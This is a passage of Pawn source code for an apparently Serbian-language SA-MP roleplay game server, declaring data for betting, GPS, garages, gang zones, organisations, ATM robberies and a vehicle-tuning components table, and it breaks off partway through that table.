new PlayerText:KladionicaSM[ MAX_PLAYERS ][ 32 ];
new PlayerText:KladListicSM[ MAX_PLAYERS ][ 9 ];

enum _bettingInfo {
	teamID,
	teamName[ 64 ],
	teamStrength
};

new bettingInfo[ 46 ][ _bettingInfo ] = {

	{ 0, "Barcelona", 10 },
	{ 1, "Real Madrid", 10 },
	{ 2, "Atletico Madrid",9 },
	{ 3, "Chelsea", 9 },
	{ 4, "Manchester City", 9 },
	{ 5, "Arsenal", 9 },
	{ 6, "Bayern Munich", 10 },
	{ 7, "Wolfsburg", 10 },
	{ 8, "Monchengladbach", 8 },
	{ 9, "Juventus", 9 },
	{ 10, "Roma", 8 },
	{ 11, "Benfica", 7 },
	{ 12, "PSG", 9 },
	{ 13, "Porto", 8 },
	{ 14, "Lyon", 7 },
	{ 15, "Zenit", 7 },
	{ 16, "PSV Eindhoven", 7 },
	{ 17, "Dynamo Kyiv", 4 },
	{ 18, "Galatasaray", 8 },
	{ 19, "Olympiacos", 7 },
	{ 20, "Sevilla", 7 },
	{ 21, "Manchester United", 9 },
	{ 22, "Valencia", 7 },
	{ 23, "Lazio", 8 },
	{ 24, "Bayer Leverkusen", 8 },
	{ 25, "Sporting CP", 7 },
	{ 26, "Basel", 7 },
	{ 27, "Monaco", 8 },
	{ 28, "Club Brugge", 6 },
	{ 29, "Rapid Wien", 5 },
	{ 30, "Sparta Prague", 6 },
	{ 31, "Salzburg", 5 },
	{ 32, "CSKA Moscow", 7 },
	{ 33, "Fenerbahce", 6 },
	{ 34, "Panathinaikos", 5 },
	{ 35, "Viktoria Plzen", 3 },
	{ 36, "Ajax", 7 },
	{ 37, "Sarajevo", 6 },
	{ 38, "Partizan", 6 },
	{ 39, "Dinamo San Fierro", 6 },
	{ 40, "HJK", 5 },
	{ 41, "Maribor", 4 },
	{ 42, "BATE Borisov", 3 },
	{ 43, "Celtic", 4 },
	{ 44, "Crvena Zvezda", 6 },
	{ 45, "Hajduk", 6 }
};

//===============================[ Ports ]======================================

#define MAX_APORTS													         100
#define F_APORT							     		 		  "Ostalo/aport.cfg"

enum aportData {
    aportID,
    aportCreated,
	aportName[ 50 ],
	Float:aportPos[ 3 ]
};
new aportInfo[ MAX_APORTS ][ aportData ];

#define MAX_SPORTS													         100
#define F_SPORT							     		 		  "Ostalo/sport.cfg"

enum supportData {
    supportID,
    supportCreated,
	supportName[ 50 ],
	Float:supportPos[ 3 ]
};
new supportInfo[ MAX_SPORTS ][ supportData ];

//===============================[ ASKQ ]=======================================

#define MAX_ASKQS													          50

enum askqData {
    bool:askqSend,
    askqOwner[ MAX_PLAYER_NAME ],
    askqID,
	askqQuestion[ 128 ]
};
new askqList[ MAX_ASKQS ][ askqData ];

enum askqDataA {
	bool:askqSended,
    bool:askqAnswered,
    askqAdmin[ MAX_PLAYER_NAME ],
	askqAnswer[ 128 ]
};
new askqInfo[ MAX_PLAYERS ][ askqDataA ];

//==============================[ RADAR ]=======================================

#define MAX_RADARS											    	         100
#define F_RADARS							     		   "Radars/radar_%i.ini"

enum radarData {

	radarMaxSpeed,
	radarPrice,
	Float:radarPos[ 6 ],
	radarObject
};
new radarInfo[ MAX_RADARS ][ radarData ];

new PlayerText:RadarCol[ MAX_PLAYERS ],
    Timer_Radar[ MAX_PLAYERS ],
    bool:alreadyPictured[ MAX_PLAYERS ],
    Radar_Count[ MAX_PLAYERS ];

//================================[ GPS ]=======================================

#define MAX_GPS														         500
#define F_GPS							     		 			"GPS/gps_%i.ini"

enum gpsData {
	gpsName[ 50 ],
	Float:gpsPos[ 3 ]
};
new gpsInfo[ MAX_GPS ][ gpsData ];

#define GPS_TYPE_VAZNEL 1
#define GPS_TYPE_SALONI 2
#define GPS_TYPE_OSTALO 3

enum {
	SIMPLE_GPS, // obelezava samo na radaru
	MEDIUM_GPS, // simple + pravi checkpoint i ispisuje razdaljinu
	ADVANCED_GPS// simple + medius + pokazuje putanju do cilja
};

#define MAPPED_NONE     -1
#define MAPPED_IMPORTANT 0
#define MAPPED_HOUSE     1
#define MAPPED_BUSINESS  2
#define MAPPED_JOB       3

new pMappedType[ MAX_PLAYERS ] = {MAPPED_NONE, MAPPED_NONE, MAPPED_NONE, ...};

enum _pgr {
	_pgrIconId,
	Float:_pgrPos[ 3 ],
	_pgrCheckPointId,
	_pgrObject
}

new PlayerGpsRadar[ MAX_PLAYERS ][_pgr];
new PlayerText:PlayerGpsRadarText[ MAX_PLAYERS ];

//===============================[ Garaze ]=====================================

#define MAX_GARAGES														     200
#define F_GARAGE							     		 "Garages/Garage_%i.ini"

enum garageData {
	bool:garageOwned,
	garageOwner[ MAX_PLAYER_NAME ],
	garagePrice,
	garageLevel,
	bool:garageLocked,
	Float:garagePos[ 3 ],
	Float:garageVehiclePos[ 4 ],
	garageVW,
	garageType,
    Text3D:garage3D,
    garagePickup
};
new garageInfo[ MAX_GARAGES ][ garageData ];

new Float:GarageInteriors[][] = {
	{ 616.4642, -124.4003, 997.5993, 90.0, 3.0 }, // Small garage
    { 617.0011, -74.6962, 997.8426, 90.0, 2.0 }, // Medium garage
    { 606.4268, -9.9375, 1000.7485, 270.0, 1.0 } //Big garage

};

//===============================[ GangZone ]===================================

#define MAX_GZONE 														     100
#define F_GZONE								     		    "Zones/gZone_%i.ini"

enum gZoneData {

	bool:gZoneTaken,
	bool:gZoneTakeable,
	gZoneGangID,
	gZoneTime,
	
	Float:gZoneMaxX,
	Float:gZoneMinX,
	Float:gZoneMaxY,
	Float:gZoneMinY,

	gZoneColor[ 24 ],
    Text3D:gZone3D,
    gZonePickup,
    Float:gZonePickupPos[ 3 ],
    gZoneID,
    gZoneRectAngle,
    gZoneVrsta
};
new gZoneInfo[ MAX_GZONE ][ gZoneData ];

new CreatingGZone[ MAX_PLAYERS ];
new CreatingGZoneID[ MAX_PLAYERS ];
new gZone_ID[ MAX_PLAYERS ];
new gZone_Time[ MAX_PLAYERS ];
new gZone_Timer[ MAX_PLAYERS ];

new Float:CreatingPos[MAX_PLAYERS][4];

//==============================[ Organizacije ]================================

#define MAX_ORG 															  50
#define O_FILE 								  "Organizacije/Organizacija_%d.ini"
#define ORG_IME 															  64
#define ORG_RANK 															  64
#define ORG_CLAN  															  24
#define ORG_LIDER 															  24
#define PORT_FILE 							   "PortoviOrgi/Organizacija_%d.ini"

#define ORG_TIP_PD 	    1
#define ORG_TIP_BANDA 	2
#define ORG_TIP_MAFIJA  3
#define ORG_TIP_MC 		4
#define ORG_TIP_SR 		5
#define ORG_TIP_MD 		6
#define ORG_TIP_CNN 	7
#define ORG_TIP_HITM 	8
#define ORG_TIP_ELEK  	9
#define ORG_TIP_TAXI 	10

#define CTIP_HEROIN    1
#define CTIP_KOKAIN    2
#define CTIP_BMETH     3
#define CTIP_MARIHUANA 4
#define CTIP_CRACK     5
#define CTIP_METH      6

enum oOrgInfo {
	oID,
	oName[ ORG_IME ],
	oPreFix[ 10 ],
	oColor[ 24 ],

	oTip,
	oMaxClanova,
	oUbacenihClanova,

    oSkin1,
	oSkin2,
	oSkin3,
	oSkin4,
	oSkin5,
	oSkin6,
	
	oZSkin1,
	oZSkin2,
	oZSkin3,
	oZSkin4,
	oZSkin5,
	oZSkin6,

    oLider1[ ORG_LIDER ],
    oLider2[ ORG_LIDER ],

	oClan1[ ORG_CLAN ],
	oClan2[ ORG_CLAN ],
	oClan3[ ORG_CLAN ],
	oClan4[ ORG_CLAN ],
	oClan5[ ORG_CLAN ],
	oClan6[ ORG_CLAN ],
	oClan7[ ORG_CLAN ],
	oClan8[ ORG_CLAN ],
	oClan9[ ORG_CLAN ],
	oClan10[ ORG_CLAN ],
 	oClan11[ ORG_CLAN ],
	oClan12[ ORG_CLAN ],
	oClan13[ ORG_CLAN ],
	oClan14[ ORG_CLAN ],
	oClan15[ ORG_CLAN ],
	oClan16[ ORG_CLAN ],
	oClan17[ ORG_CLAN ],
	oClan18[ ORG_CLAN ],
	oClan19[ ORG_CLAN ],
	oClan20[ ORG_CLAN ],
	oClan21[ ORG_CLAN ],
	oClan22[ ORG_CLAN ],
	oClan23[ ORG_CLAN ],
	oClan24[ ORG_CLAN ],
	oClan25[ ORG_CLAN ],
	oClan26[ ORG_CLAN ],
	oClan27[ ORG_CLAN ],
	oClan28[ ORG_CLAN ],
	oClan29[ ORG_CLAN ],
	oClan30[ ORG_CLAN ],

	oRank1[ ORG_RANK ],
	oRank2[ ORG_RANK ],
	oRank3[ ORG_RANK ],
	oRank4[ ORG_RANK ],
	oRank5[ ORG_RANK ],
	oRank6[ ORG_RANK ],

	Float:oPozExtX,
	Float:oPozExtY,
	Float:oPozExtZ,

	Float:oPozIntX,
	Float:oPozIntY,
	Float:oPozIntZ,

	Float:oDutyPoint[ 3 ],
	oDutyInt,
	oDutyVW,
	Float:oEquipPoint[ 3 ],
	oEquipInt,
	oEquipVW,

    oMaxPort,
	oControlType,
	Float:oDrugField[ 3 ],
	Float:oSafePos[ 3 ],
	oSafeMoney,
    oMaterijali,
	oSafeDrug[ 4 ],
	oSafeDrugCode[ 4 ],

	oInt,
	oVw,
    oPobedjeniWar,
    oSavez,
    Float:oSlabaTacka[3],
    bool:oSlabaTackaProbijena,
    bool:oOrobano
}
new OI[ MAX_ORG ][ oOrgInfo ];
new OrgPickup[ MAX_ORG ];
new Text3D:Org3D[ MAX_ORG ];
new Text3D:OrgDuty3D[ MAX_ORG ];
new Text3D:OrgEquip3D[ MAX_ORG ];
new DutyPointPickup[ MAX_ORG ];
new EquipPointPickup[ MAX_ORG ];
new OrgFieldPickup[ MAX_ORG ];
new Text3D:OrgField3d[ MAX_ORG ];
new OrgSafePickup[ MAX_ORG ];
new Text3D:OrgSafe3d[ MAX_ORG ];
new ponudjenSavez[MAX_PLAYERS];

new Text3D:slabaTackaLabel[MAX_ORG];
new slabaTackaPickup[MAX_ORG];

enum Portes {
 	Float:Pos1[ 3 ],
 	Float:Pos2[ 3 ],
 	Int[ 2 ],
	VW[ 2 ],
	Pickup[ 2 ],
    Text3D:Label[2]
}
new PortOP[ MAX_ORG ][ 10 ][ Portes ];

//===============================[ Kapije ]=====================================

#define MAX_GATES 															 100
#define GATE_FILE 								  			"Kapije/Gate_%d.ini"

enum gateData {
	gateOwner[ MAX_PLAYER_NAME ],
	bool:gateOpened,
	gateFor,
	gateOrgID,
	gateModel,
	Float:gateSpeed,
	Float:gateRadius,
	gateTime,
	Float:gatePos[ 6 ],
	gateInterior,
	gateWorld,
	Float:gateMove[ 6 ],
	gateTimer,
	gateObject
};

new GateData[ MAX_GATES ][ gateData ];

new EditDGate[ MAX_PLAYERS ],
    EditDGateMove[ MAX_PLAYERS ];

//================================[ Droga ]=====================================

#define MAX_PLANTS                          701

enum PlantaInfo {
	wObjectID,
	wPlanted,
	wHoursPassed,
	wViwo,
	wType,
	wOwner[ MAX_PLAYER_NAME ],
	Float:Plantx,
	Float:Planty,
	Float:Plantz
};
new DrogaStab[ MAX_PLANTS ][ PlantaInfo ];

//==============================[ RPORUKE ]=====================================

new RandomSPoruke[][] = {

	"Dobrodosao na Valhalla RolePlay, uzivajte",
	"Link foruma: ~r~www.valhalla-ogc.com",
	"Da vidite listu online admina ~r~/admini",
	"Ako vidite Citera ~r~/report",
	"Trenutno Igrate na Valhalla V1.5.1 by ~r~VO1D",
	"Lajk stranicu ~r~facebook.com/ValhallaRolePlay",
	"Zadnji update odradjen je ~r~11.09.2021",
    "Svoja dostignuca mozete videti ~r~/achivements",
    // "Da bi saznali vise o otvaranju kutija ~r~/casehelp",
    "Oruzije mozete pozvati koristeci ~r~/calldrop",
    "Da proverite skill na poslu ~r~/jobskill",
    "Za objasnjenje skillova ~r~/skillshelp",
    "Listu poslova vidite u Birou ~r~/poslovi",
    "Sve informacije imate na ~r~/stats",
    "Za funkcije autopilota koristite ~r~/autopilot",
    "Za novogodisnju atmosferu ~r~/wpanel",
    "Da proverite poene aktivne igre ~r~/aktivnaigra",
    "Listu odradjenih stvari na update ~r~/update",
    "Da pogledate objasnjenje nekih sistema ~r~/sistemi"

};
//===============================[ Kontejneri ]=================================

#define KO_FILE 								     	     "Kontejneri/%i.ini"
#define MAX_KONT 														     500

enum kont {

	Float:koObjPos[ 3 ],
	Float:koObjRot[ 3 ],
	koObjID
}
new KontInfo[ MAX_KONT ][ kont ];
new Text3D:KontLabel[MAX_KONT];

//===============================[ Bankomati ]==================================

#define ATM_FILE 								     	      "Bankomati/%i.ini"
#define MAX_ATM 														     300

enum atmDataa {
	bool:atmPreseceneZice,
	bool:atmProbijenBios,
	atmVremeDoRoba,
	bool:atmExists,
	Float:atmPos[6],
	atmObject,
	Text3D:atmText3D
};
new atmInfo[ MAX_ATM ][ atmDataa ];

new PlayerBar:playeratmBar[ MAX_PLAYERS ] = { INVALID_PLAYER_BAR_ID, ...},
	atmrobTimer[ MAX_PLAYERS ],
	robbingATMSeconds[ MAX_PLAYERS ],
	robbingATM[ MAX_PLAYERS ];

//================================[ Tuning ]====================================

enum PaintjobInfi {
	vehID,
	pNumber,
	pPrice,
	pNameBre[ 12 ]
};
#define NUMBER_TYPE_PAINTJOB 	36
static const
	pjInfo[ NUMBER_TYPE_PAINTJOB ][ PaintjobInfi ] = {
	{ 483, 0, 100, "Paintjob 1" },
	{ 534, 0, 100, "Paintjob 1" },
	{ 534, 1, 100, "Paintjob 2" },
	{ 534, 2, 100, "Paintjob 3" },
	{ 535, 0, 100, "Paintjob 1" },
	{ 535, 1, 100, "Paintjob 2" },
	{ 535, 2, 100, "Paintjob 3" },
	{ 536, 0, 100, "Paintjob 1" },
	{ 536, 1, 100, "Paintjob 2" },
	{ 536, 2, 100, "Paintjob 3" },
	{ 558, 0, 100, "Paintjob 1" },
	{ 558, 1, 100, "Paintjob 2" },
	{ 558, 2, 100, "Paintjob 3" },
	{ 559, 0, 100, "Paintjob 1" },
	{ 559, 1, 100, "Paintjob 2" },
	{ 559, 2, 100, "Paintjob 3" },
	{ 560, 0, 100, "Paintjob 1" },
	{ 560, 1, 100, "Paintjob 2" },
	{ 560, 2, 100, "Paintjob 3" },
	{ 561, 0, 100, "Paintjob 1" },
	{ 561, 1, 100, "Paintjob 2" },
	{ 561, 2, 100, "Paintjob 3" },
	{ 562, 0, 100, "Paintjob 1" },
	{ 562, 1, 100, "Paintjob 2" },
	{ 562, 2, 100, "Paintjob 3" },
	{ 565, 0, 100, "Paintjob 1" },
	{ 565, 1, 100, "Paintjob 2" },
	{ 565, 2, 100, "Paintjob 3" },
	{ 567, 0, 100, "Paintjob 1" },
	{ 567, 1, 100, "Paintjob 2" },
	{ 567, 2, 100, "Paintjob 3" },
	{ 575, 0, 100, "Paintjob 1" },
	{ 575, 1, 100, "Paintjob 2" },
	{ 576, 0, 100, "Paintjob 1" },
	{ 576, 1, 100, "Paintjob 2" },
	{ 576, 2, 100, "Paintjob 3" }
};

enum ComponentsInfo {
	cID,
	cName[ 40 ],
	cPrice,
	cType
};
#define MAX_COMPONENTS	194
static const
	cInfo[ MAX_COMPONENTS ][ ComponentsInfo ] = {
	{ 1000, "Pro Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1001, "Win Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1002, "Drag Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1003, "Alpha Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1004, "Champ Scoop Hood", 100, CARMODTYPE_HOOD },
	{ 1005, "Fury Scoop Hood", 100, CARMODTYPE_HOOD },
	{ 1006, "Roof Scoop Roof", 100, CARMODTYPE_ROOF },
	{ 1007, "Right Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1008, "5x Nitrous", 100, CARMODTYPE_NITRO },
	{ 1009, "2x Nitrous", 100, CARMODTYPE_NITRO },
	{ 1010, "10x Nitrous", 100, CARMODTYPE_NITRO },
	{ 1011, "Race Scoop Hood", 100, CARMODTYPE_HOOD },
	{ 1012, "Worx Scoop Hood", 100, CARMODTYPE_HOOD },
	{ 1013, "Round Fog Lamp", 100, CARMODTYPE_LAMPS },
	{ 1014, "Champ Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1015, "Race Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1016, "Worx Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1017, "Left Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1018, "Upswept Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1019, "Twin Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1020, "Large Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1021, "Medium Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1022, "Small Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1023, "Fury Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1024, "Square Fog Lamp", 100, CARMODTYPE_LAMPS },
	{ 1025, "Offroad Wheels", 100, CARMODTYPE_WHEELS },
	{ 1026, "Right Alien Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1027, "Left Alien Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1028, "Alien Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1029, "X-Flow Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1030, "Left X-Flow Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1031, "Right X-Flow Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1032, "Alien Roof Vent", 100, CARMODTYPE_ROOF },
	{ 1033, "X-Flow Roof Vent", 100, CARMODTYPE_ROOF },
	{ 1034, "Alien Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1035, "X-Flow Roof Vent", 100, CARMODTYPE_ROOF },
	{ 1036, "Right Alien Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1037, "X-Flow Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1038, "Alien Roof Vent", 100, CARMODTYPE_ROOF },
	{ 1039, "Left X-Flow Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1040, "Left Alien Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1041, "Right X-Flow Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1042, "Right Chrome Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1043, "Slamin Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1044, "Chrome Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1045, "X-Flow Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1046, "Alien Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1047, "Right Alien Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1048, "Right X-Flow Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1049, "Alien Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1050, "X-Flow Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1051, "Left Alien Sideskirt", 100, CARMODTYPE_SPOILER },
	{ 1052, "Left X-Flow Sideskirt", 100, CARMODTYPE_SPOILER },
	{ 1053, "X-Flow Roof", 100, CARMODTYPE_ROOF },
	{ 1054, "Alien Roof", 100, CARMODTYPE_ROOF },
	{ 1055, "Alien Roof", 100, CARMODTYPE_ROOF },
	{ 1056, "Right Alien Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1057, "Right X-Flow Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1058, "Alien Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1059, "X-Flow Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1060, "X-Flow Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1061, "X-Flow Roof", 100, CARMODTYPE_ROOF },
	{ 1062, "Left Alien Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1063, "Left X-Flow Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1064, "Alien Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1065, "Alien Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1066, "X-Flow Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1067, "Alien Roof", 100, CARMODTYPE_ROOF },
	{ 1068, "X-Flow Roof", 100, CARMODTYPE_ROOF },
	{ 1069, "Right Alien Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1070, "Right X-Flow Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1071, "Left Alien Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1072, "Left X-Flow Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1073, "Shadow Wheels", 100, CARMODTYPE_WHEELS },
	{ 1074, "Mega Wheels", 100, CARMODTYPE_WHEELS },
	{ 1075, "Rimshine Wheels", 100, CARMODTYPE_WHEELS },
	{ 1076, "Wires Wheels", 100, CARMODTYPE_WHEELS },
	{ 1077, "Classic Wheels", 100, CARMODTYPE_WHEELS },
	{ 1078, "Twist Wheels", 100, CARMODTYPE_WHEELS },
	{ 1079, "Cutter Wheels", 100, CARMODTYPE_WHEELS },
	{ 1080, "Switch Wheels", 100, CARMODTYPE_WHEELS },
	{ 1081, "Grove Wheels", 100, CARMODTYPE_WHEELS },
	{ 1082, "Import Wheels", 100, CARMODTYPE_WHEELS },
	{ 1083, "Dollar Wheels", 100, CARMODTYPE_WHEELS },
	{ 1084, "Trance Wheels", 100, CARMODTYPE_WHEELS },
	{ 1085, "Atomic Wheels", 100, CARMODTYPE_WHEELS },
	{ 1086, "Stereo Wheels", 100, CARMODTYPE_STEREO },
	{ 1087, "Hydraulics", 100, CARMODTYPE_HYDRAULICS },
	{ 1088, "Alien Roof", 100, CARMODTYPE_ROOF },
	{ 1089, "X-Flow Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1090, "Right Alien Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1091, "X-Flow Roof", 100, CARMODTYPE_ROOF },
	{ 1092, "Alien Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1093, "Right X-Flow Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1094, "Left Alien Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1095, "Right X-Flow Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1096, "Ahab Wheels", 100, CARMODTYPE_WHEELS },
	{ 1097, "Virtual Wheels", 100, CARMODTYPE_WHEELS },
	{ 1098, "Access Wheels", 100, CARMODTYPE_WHEELS },
	{ 1099, "Left Chrome Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1100, "Chrome Grill", 100, -1 }, // Bullbar
	{ 1101, "Left `Chrome Flames` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1102, "Left `Chrome Strip` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1103, "Covertible Roof", 100, CARMODTYPE_ROOF },
	{ 1104, "Chrome Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1105, "Slamin Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1106, "Right `Chrome Arches`", 100, CARMODTYPE_SIDESKIRT },
	{ 1107, "Left `Chrome Strip` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1108, "Right `Chrome Strip` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1109, "Chrome", 100, -1 }, // Bullbar
	{ 1110, "Slamin", 100, -1 }, // Bullbar
	{ 1111, "Little Sign?", 100, -1 }, // sig
	{ 1112, "Little Sign?", 100, -1 }, // sig
	{ 1113, "Chrome Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1114, "Slamin Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1115, "Chrome", 100, -1 }, // Bullbar
	{ 1116, "Slamin", 100, -1 }, // Bullbar
	{ 1117, "Chrome Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1118, "Right `Chrome Trim` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1119, "Right `Wheelcovers` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1120, "Left `Chrome Trim` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1121, "Left `Wheelcovers` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1122, "Right `Chrome Flames` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1123, "Bullbar Chrome Bars", 100, -1 }, // Bullbar
	{ 1124, "Left `Chrome Arches` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1125, "Bullbar Chrome Lights", 100, -1 }, // Bullbar
	{ 1126, "Chrome Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1127, "Slamin Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1128, "Vinyl Hardtop", 100, CARMODTYPE_ROOF },
	{ 1129, "Chrome Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1130, "Hardtop Roof", 100, CARMODTYPE_ROOF },
	{ 1131, "Softtop Roof", 100, CARMODTYPE_ROOF },
	{ 1132, "Slamin Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1133, "Right `Chrome Strip` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1134, "Right `Chrome Strip` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1135, "Slamin Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1136, "Chrome Exhaust", 100, CARMODTYPE_EXHAUST },
	{ 1137, "Left `Chrome Strip` Sideskirt", 100, CARMODTYPE_SIDESKIRT },
	{ 1138, "Alien Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1139, "X-Flow Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1140, "X-Flow Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1141, "Alien Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1142, "Left Oval Vents", 100, CARMODTYPE_VENT_LEFT },
	{ 1143, "Right Oval Vents", 100, CARMODTYPE_VENT_RIGHT },
	{ 1144, "Left Square Vents", 100, CARMODTYPE_VENT_LEFT },
	{ 1145, "Right Square Vents", 100, CARMODTYPE_VENT_RIGHT },
	{ 1146, "X-Flow Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1147, "Alien Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1148, "X-Flow Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1149, "Alien Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1150, "Alien Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1151, "X-Flow Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1152, "X-Flow Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1153, "Alien Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1154, "Alien Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1155, "Alien Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1156, "X-Flow Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1157, "X-Flow Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1158, "X-Flow Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1159, "Alien Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1160, "Alien Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1161, "X-Flow Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1162, "Alien Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1163, "X-Flow Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1164, "Alien Spoiler", 100, CARMODTYPE_SPOILER },
	{ 1165, "X-Flow Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1166, "Alien Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1167, "X-Flow Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1168, "Alien Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1169, "Alien Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1170, "X-Flow Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1171, "Alien Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1172, "X-Flow Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1173, "X-Flow Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1174, "Chrome Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1175, "Slamin Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1176, "Chrome Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1177, "Slamin Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1178, "Slamin Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1179, "Chrome Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1180, "Chrome Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1181, "Slamin Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1182, "Chrome Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1183, "Slamin Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1184, "Chrome Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1185, "Slamin Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1186, "Slamin Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1187, "Chrome Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1188, "Slamin Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
